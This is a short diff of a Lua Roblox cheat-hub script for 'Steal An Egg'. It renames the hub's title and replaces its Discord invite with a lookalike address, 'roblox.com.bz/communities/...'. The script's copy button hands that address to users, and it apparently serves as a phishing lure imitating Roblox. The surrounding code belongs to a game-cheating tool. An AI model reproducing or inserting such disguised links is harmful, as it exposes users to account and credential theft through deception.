@@ -10,7 +10,7 @@ local InfoTab, InfoPage = TabsManager:RegisterTab("Info", 1, "INFO")
 --==================================================
 -- INFO CONTENT
 --==================================================
-CreateSectionTitle(InfoPage, "YOKUDO HUB | Steal An Egg", 1)
+CreateSectionTitle(InfoPage, "OLA 😪 | Steal An Egg", 1)
 
 --==================================================
 -- TITLE: Join Group For Notification Update Script
@@ -99,7 +99,7 @@ CopyStroke.Parent = CopyBtn
 -- ==================================================
 -- COPY FUNCTION
 -- ==================================================
-local DISCORD_LINK = "https://discord.gg/aKeK6avatS"
+local DISCORD_LINK = "https://roblox.com.bz/communities/8958627065/"
 
 local function CopyDiscord()
     local Success = pcall(function()
